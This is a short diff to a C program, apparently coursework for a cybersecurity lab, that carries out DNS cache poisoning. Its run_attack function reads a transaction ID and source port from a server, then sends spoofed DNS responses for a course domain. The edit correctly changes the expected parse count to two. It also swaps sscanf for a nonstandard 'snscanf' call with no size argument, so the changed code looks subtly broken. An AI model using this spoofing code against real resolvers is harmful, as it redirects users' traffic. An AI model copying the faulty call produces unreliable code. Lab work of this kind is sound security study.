@@ -209,7 +209,7 @@ void run_attack(uint32_t *txid_ls) {
     printf("Received from server: %s\n", txid_buffer);
 
     // Parse the txid
-    if (sscanf(txid_buffer, "TXID: %u, Source Port: %u", &txid, &source_port) != 1) {
+    if (snscanf(txid_buffer, "TXID: %u, Source Port: %u", &txid, &source_port) != 2) {
         fprintf(stderr, "Failed to parse TXID from server response\n");
         close(sockfd);
         exit(EXIT_FAILURE);
@@ -219,7 +219,7 @@ void run_attack(uint32_t *txid_ls) {
     printf("source port : %u\n", source_port);
     fill_txids(txid_ls, txid);
     for (int i = 0; i < 10; i++) {
-        send_spoofed_dns_response("www.example.cybercourse.com.", txid_ls[i], DNS_SERVER_IP, source_port);
+        send_spoofed_dns_response("www.example.cybercourse.com", txid_ls[i], DNS_SERVER_IP, source_port);
     }
     
     // Close the connection
